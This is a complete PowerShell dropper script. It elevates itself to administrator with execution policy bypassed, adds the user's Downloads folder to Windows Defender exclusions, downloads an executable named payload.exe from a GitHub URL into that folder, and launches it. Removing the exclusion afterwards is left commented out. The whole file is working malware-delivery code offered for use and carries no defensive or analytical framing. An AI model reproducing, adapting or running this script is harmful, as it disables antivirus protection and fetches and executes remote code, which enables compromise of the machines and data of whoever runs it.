
function Ensure-Administrator {
    
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
        [Security.Principal.WindowsBuiltInRole] "Administrator")

    if (-not $isAdmin) {
        try {
            
            Write-Host "Attempting to restart the script with administrative privileges..." -ForegroundColor Yellow
            Start-Process -FilePath "PowerShell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
            # Exit the current (non-elevated) script
            exit
        }
        catch {
            Write-Error "Failed to elevate to administrative privileges: $_"
            exit 1
        }
    }
    else {
        Write-Host "Script is running with administrative privileges." -ForegroundColor Green
    }
}

# Function to add a folder to Windows Defender exclusions
function Add-WindowsDefenderExclusion {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    try {
        Write-Host "Adding '$Path' to Windows Defender exclusions..." -ForegroundColor Cyan
        Add-MpPreference -ExclusionPath $Path
        
        # Adding a 5-second delay to ensure the exclusion is processed
        Start-Sleep -Seconds 5

        Write-Host "Successfully added '$Path' to exclusions." -ForegroundColor Green
    }
    catch {
        Write-Error "Failed to add exclusion: $_"
        exit 1
    }
}

# Function to download a file from a URL to a specified path
function Download-File {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Url,

        [Parameter(Mandatory = $true)]
        [string]$DestinationPath
    )

    try {
        Write-Host "Downloading file from '$Url' to '$DestinationPath'..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri $Url -OutFile $DestinationPath
        Write-Host "Download completed successfully." -ForegroundColor Green
    }
    catch {
        Write-Error "Failed to download file: $_"
        exit 1
    }
}

# Function to execute a file
function Execute-File {
    param (
        [Parameter(Mandatory = $true)]
        [string]$FilePath
    )

    try {
        Write-Host "Executing file '$FilePath'..." -ForegroundColor Cyan
        # Start the process without waiting for it to finish
        Start-Process -FilePath $FilePath
        Write-Host "Execution initiated." -ForegroundColor Green
    }
    catch {
        Write-Error "Failed to execute file: $_"
        exit 1
    }
}

# Main Script Execution

# 1. Ensure the script is running with administrative privileges
Ensure-Administrator

# Define the Downloads folder path
$DownloadsPath = "$env:USERPROFILE\Downloads"

# 2. Add Downloads folder to Windows Defender exclusion
Add-WindowsDefenderExclusion -Path $DownloadsPath

# 3. Download and run file in exclusion path
# Define the URL of the file to download
# Replace the URL below with the URL of the file you wish to download
$fileUrl = "https://github.com/swagkarna/test1/raw/refs/heads/main/payload.exe"

# Define the destination file path
$destinationFile = Join-Path -Path $DownloadsPath -ChildPath "downloadedFile.exe"

# Download the file
Download-File -Url $fileUrl -DestinationPath $destinationFile

# Execute the downloaded file
Execute-File -FilePath $destinationFile

# Optional: Remove the exclusion after execution
# Uncomment the lines below if you wish to remove the exclusion after running the file

# try {
#     Write-Host "Removing '$DownloadsPath' from Windows Defender exclusions..." -ForegroundColor Cyan
#     Remove-MpPreference -ExclusionPath $DownloadsPath
#     Write-Host "Successfully removed '$DownloadsPath' from exclusions." -ForegroundColor Green
# }
# catch {
#     Write-Error "Failed to remove exclusion: $_"
# }

Write-Host "Script execution completed." -ForegroundColor Yellow

# Exit the script to close the PowerShell window
exit